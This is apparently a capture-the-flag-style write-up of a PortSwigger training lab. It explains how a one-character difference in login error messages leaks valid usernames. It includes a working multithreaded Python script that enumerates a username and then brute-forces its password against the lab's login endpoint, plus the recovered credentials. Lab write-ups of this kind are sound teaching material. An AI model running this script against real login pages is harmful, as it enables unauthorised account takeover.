# Lab: Username enumeration via subtly different responses
## Task
This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

[Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)  
[Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)  
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Solution
This lab is pretty much the same as the [previous one](https://github.com/datthinh1801/Writeups/blob/main/PortSwigger/Authentication/Lab%2001.md), except for the messages returned.  

In this lab, `Invalid username or password.` will be returned if an invalid username is given. In case an incorrect password is given, `Invalid username or password` is returned (_note that there is no dot `.`_).  

Script:  
```python
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

URL = 'https://ac0a1f3a1f3e999380b6302000c10060.web-security-academy.net/login'

with open('usernames.txt', 'r') as f:
    usernames = f.readlines()

usernames = list(map(lambda x: x.strip(), usernames))

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

passwords = list(map(lambda x: x.strip(), passwords))

true_username = None
true_password = None


def brute_username(username):
    resp = requests.post(url=URL, data={'username': username, 'password': 'test'})
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find(class_='is-warning').text != 'Invalid username or password.':
        return username
    else:
        return ''


def brute_password(password):
    resp = requests.post(url=URL, data={'username': true_username, 'password': password})
    soup = BeautifulSoup(resp.text, 'html.parser')
    try:
        warning = soup.find(class_='is-warning').text
        return ''
    except:
        return password


with ThreadPoolExecutor(max_workers=10) as executor:
    res = list(executor.map(brute_username, usernames))
    true_username = ''.join(res)

with ThreadPoolExecutor(max_workers=10) as executor:
    res = list(executor.map(brute_password, passwords))
    true_password = ''.join(res)

print(true_username, true_password)
```

Run script:
```py
E:\PortSwigger\venv\Scripts\python.exe E:/PortSwigger/brute_forcer.py
oracle soccer
```

Login:  

![image](https://user-images.githubusercontent.com/44528004/130234581-d7b077fe-ac4e-44ba-9113-b7c82a7db0e9.png)  

![image](https://user-images.githubusercontent.com/44528004/130234624-44312a0a-598b-4211-b3c9-c1cc893cd002.png)
> Solved

